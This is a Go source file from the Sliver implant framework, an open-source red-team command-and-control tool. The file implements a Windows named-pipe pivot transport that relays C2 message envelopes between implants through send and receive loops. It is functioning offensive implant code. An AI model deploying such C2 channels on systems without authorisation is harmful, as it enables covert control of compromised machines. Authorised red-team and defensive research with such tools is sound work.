//go:build windows

package transports

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// {{if .Config.NamePipec2Enabled}}

import (
	"io"
	"net/url"
	"sync"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"github.com/bishopfox/sliver/implant/sliver/transports/pivotclients"
	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
)

func namedPipeConnect(uri *url.URL) (*Connection, error) {
	opts := &pivotclients.NamedPipePivotOptions{}
	client, err := pivotclients.NamedPipePivotStartSession(uri, opts)
	if err != nil {
		return nil, err
	}
	send := make(chan *pb.Envelope)
	recv := make(chan *pb.Envelope)
	ctrl := make(chan struct{}, 1)
	connection := &Connection{
		Send:    send,
		Recv:    recv,
		ctrl:    ctrl,
		tunnels: &map[uint64]*Tunnel{},
		mutex:   &sync.RWMutex{},
		once:    &sync.Once{},
		IsOpen:  true,
		cleanup: func() {
			// {{if .Config.Debug}}
			log.Printf("[namedpipe] lost connection, cleanup...")
			// {{end}}
			close(send)
			ctrl <- struct{}{}
			close(recv)
		},
	}

	connection.Stop = func() error {
		// {{if .Config.Debug}}
		log.Printf("[namedpipe] Stop()")
		// {{end}}
		connection.Cleanup()
		return nil
	}

	go func() {
		defer connection.Cleanup()
		for envelope := range send {
			// {{if .Config.Debug}}
			log.Printf("[namedpipe] send loop envelope type %d\n", envelope.Type)
			// {{end}}
			client.WriteEnvelope(envelope)
		}
	}()

	go func() {
		defer connection.Cleanup()
		for {
			envelope, err := client.ReadEnvelope()
			if err == io.EOF {
				break
			}
			if err == nil {
				recv <- envelope
				// {{if .Config.Debug}}
				log.Printf("[namedpipe] Receive loop envelope type %d\n", envelope.Type)
				// {{end}}
			}
		}
	}()

	return connection, nil
}

// {{end}} -NamePipec2Enabled
